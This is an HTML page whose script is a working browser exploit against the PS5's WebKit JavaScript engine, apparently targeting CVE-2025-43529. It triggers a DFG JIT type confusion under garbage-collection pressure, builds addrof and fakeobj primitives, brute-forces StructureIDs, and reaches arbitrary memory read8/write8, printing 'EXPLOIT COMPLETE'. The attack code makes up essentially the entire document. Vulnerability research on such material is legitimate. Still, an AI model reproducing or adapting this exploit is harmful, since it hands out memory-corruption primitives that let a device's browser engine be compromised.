<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 - DFG Type Confusion (No recursive)</title>
<style>
body{background:#0a0a0a;color:#00ff41;font-family:monospace;padding:20px}
pre{white-space:pre-wrap;word-wrap:break-word}
.ok{color:#00ff41}.er{color:#ff3333}.hl{color:#00ffff}.mg{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<pre id="o"></pre>
<script>
var o=document.getElementById("o");
function p(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";o.appendChild(s);o.scrollTop=o.scrollHeight}
function Ok(m){p("[+] "+m,"ok")}function Fl(m){p("[-] "+m,"er")}
function Hi(m){p("[*] "+m,"hl")}function St(m){p("[!] "+m,"mg")}

p("=== DFG Type Confusion (No recursive) ===\n");

try {
    var arr = new Array(0x40_0000).fill(1.1);
    var ai = arr.length - 1;
    var rc = [];

    function foo(flag, k, allocCount) {
        var A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
        arr[ai] = A;
        var gc = [];
        var a = new Date(1111);
        a[0] = 1.1;
        
        // GC pressure via ArrayBuffer (NO recursive)
        for (var j = 0; j < allocCount; ++j) {
            gc.push(new ArrayBuffer(0x80_0000)); // 8MB each
        }
        
        A.p2 = gc;
        var b = { p0: 0x42424242, p1: 1.1 };
        var f = b;
        if (flag) { f = 1.1; }
        A.p1 = f;
        
        // Reduced loop: 1e4 instead of 1e6 (enough for DFG trigger)
        var v = 1.1;
        for (var i = 0; i < 1e4; ++i) {
            for (var j = 0; j < k; ++j) { v = i; v = j; }
        }
        b.p0 = v;
        b.p1 = a;
    }

    // ============================================================
    // Phase 1: DFG Warmup (50 invocations — enough for DFG)
    // ============================================================
    Hi("Phase 1: DFG Warmup (50 calls)...");
    Hi("Each call has 1e4 loop (was 1e6 — 100x faster)");
    
    foo(true, 1, 1);   // Initial type specialization
    foo(false, 1, 1);  // Contradict type
    
    var warmupStart = Date.now();
    for (var i = 0; i < 50; ++i) {
        foo(false, 0, 0);  // Fast warmup (k=0, no alloc)
        if (i % 10 === 0) p("  Warmup " + i + "/50...");
    }
    Ok("Warmup done in " + (Date.now() - warmupStart) + "ms");

    // ============================================================
    // Phase 2: GC pressure (replaces recursive)
    // ============================================================
    Hi("Phase 2: GC pressure via ArrayBuffer...");
    
    // Allocate and release to trigger GC cycles
    for (var i = 0; i < 20; i++) {
        var t = [];
        for (var j = 0; j < 50; j++) t.push(new ArrayBuffer(0x100000)); // 1MB each
        // Release — GC will collect these
    }
    Ok("GC pressure applied");

    // ============================================================
    // Phase 3: Trigger overlap (100 attempts, no recursive)
    // ============================================================
    Hi("Phase 3: Trigger overlap (100 attempts)...");
    Hi("NO recursive() — just ArrayBuffer pressure");
    
    var win = false;
    var ba, ua;
    var triggerStart = Date.now();

    for (var k = 0; k < 100 && !win; ++k) {
        // Trigger foo with GC pressure
        foo(false, 10, k % 5 + 1);
        
        // GC pressure via ArrayBuffer (replaces recursive(10000))
        for (var i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
        
        // Additional GC pressure
        if (k % 10 === 0) {
            var t = [];
            for (var j = 0; j < 20; j++) t.push(new ArrayBuffer(0x100000));
        }
        
        var fd = arr[ai].p1.p1;
        var nc = 13.37;
        
        for (var i = 0; i < 16; ++i) {
            var a2 = [13.37, 2.2, 3.3, 4.4, nc];
            rc.push(a2);
            if (fd[0] === 13.37) {
                win = true;
                ba = rc[rc.length - 1];
                ba[0] = {};
                ua = fd;
                break;
            }
        }
        
        if (k % 10 === 0) p("  Attempt " + k + "/100... (" + (Date.now() - triggerStart) + "ms)");
    }

    if (!win) {
        Fl("No overlap after 100 attempts");
        Hi("This means DFG is NOT active on PS5.");
        Hi("CVE-2025-43529 is impossible without JIT.");
        Hi("Returning to CSSFontFace + EventTarget approach.");
    } else {
        St("OVERLAP FOUND! DFG IS ACTIVE!");
        
        // Build addrof/fakeobj
        var ab = new ArrayBuffer(8);
        var u64 = new BigUint64Array(ab);
        var f64 = new Float64Array(ab);
        function i2f(v) { u64[0] = v; return f64[0]; }
        function f2i(f) { f64[0] = f; return u64[0]; }
        
        function addrof(obj) { ba[0] = obj; return f2i(ua[0]); }
        function fakeobj(addr) { ua[0] = i2f(addr); return ba[0]; }
        
        var t = { x: 1.1 };
        var ta = addrof(t);
        Ok("addrof(t) = 0x" + ta.toString(16));
        
        // Build read8/write8
        Hi("Building read8/write8...");
        
        var sp = [];
        for (var i = 0; i < 500; ++i) sp.push({ p1: 1.1, p2: 2.2 });
        
        var oA = null, oAa = 0n;
        for (var i = 1; i < sp.length; ++i) {
            var prev = addrof(sp[i-1]);
            var curr = addrof(sp[i]);
            if (curr - prev === 0x20n) {
                oA = sp[i-1];
                oAa = prev;
                Ok("Adjacent pair at 0x" + oAa.toString(16));
                break;
            }
        }
        
        if (!oA) { Fl("No pair found"); throw "No pair"; }
        
        var fa = fakeobj(oAa + 0x10n);
        var kn = [13.37, 2.2, 3.3, 4.4];
        var kna = addrof(kn);
        Ok("Known array at 0x" + kna.toString(16));
        
        Hi("Brute forcing StructureID...");
        var fs = false, fc = 0n, fo = 0n;
        var offs = [0x00n, 0x08n, 0x10n, 0x18n, 0x20n, 0x28n, 0x30n];
        
        for (var sid = 0; sid < 512 && !fs; ++sid) {
            var cv = BigInt(sid) | 0x0024070000000000n;
            try {
                oA.p1 = i2f(cv);
                for (var oi = 0; oi < offs.length; ++oi) {
                    oA.p2 = i2f(kna + offs[oi]);
                    try {
                        var v = fa[0];
                        if (v === 13.37) {
                            fs = true; fc = cv; fo = offs[oi];
                            St("FOUND SID=" + sid + " OFF=0x" + fo.toString(16));
                            break;
                        }
                    } catch(e2) {}
                }
            } catch(e) {}
        }
        
        if (!fs) {
            // Try alternate types
            var alts = [0x002403n, 0x002406n, 0x002408n];
            for (var ti = 0; ti < alts.length && !fs; ++ti) {
                for (var sid = 0; sid < 512 && !fs; ++sid) {
                    var cv = BigInt(sid) | (alts[ti] << 32n);
                    try {
                        oA.p1 = i2f(cv);
                        for (var oi = 0; oi < offs.length; ++oi) {
                            oA.p2 = i2f(kna + offs[oi]);
                            try {
                                var v = fa[0];
                                if (typeof v === 'number' && v === 13.37) {
                                    fs = true; fc = cv; fo = offs[oi];
                                    St("FOUND T=" + ti + " SID=" + sid + " OFF=0x" + fo.toString(16));
                                    break;
                                }
                            } catch(e2) {}
                        }
                    } catch(e) {}
                }
            }
        }
        
        if (!fs) { Fl("No structure found"); throw "No structure"; }
        
        oA.p1 = i2f(fc);
        
        function read8(addr) { oA.p2 = i2f(addr); return f2i(fa[0]); }
        function write8(addr, val) { oA.p2 = i2f(addr); fa[0] = i2f(val); }
        
        // Test
        var jsc = read8(kna);
        Ok("read8(kna) = 0x" + jsc.toString(16));
        
        var bp = read8(kna + 0x08n);
        Ok("butterfly = 0x" + bp.toString(16));
        
        var e0 = read8(bp);
        Ok("elem[0] = " + i2f(e0) + " (expect 13.37)");
        
        write8(bp, f2i(99.99));
        Ok("write8: kn[0] = " + kn[0] + " (expect 99.99)");
        
        St("=== EXPLOIT COMPLETE ===");
        Ok("addrof:  ✅");
        Ok("fakeobj: ✅");
        Ok("read8:   ✅");
        Ok("write8:  ✅");
        Ok("StructureID: 0x" + fc.toString(16));
        
        Hi("Total time: " + (Date.now() - triggerStart) + "ms");
    }

} catch(e) {
    Fl("ERROR: " + e);
    p("Stack: " + (e.stack || ""));
}
</script>
</body>
</html>
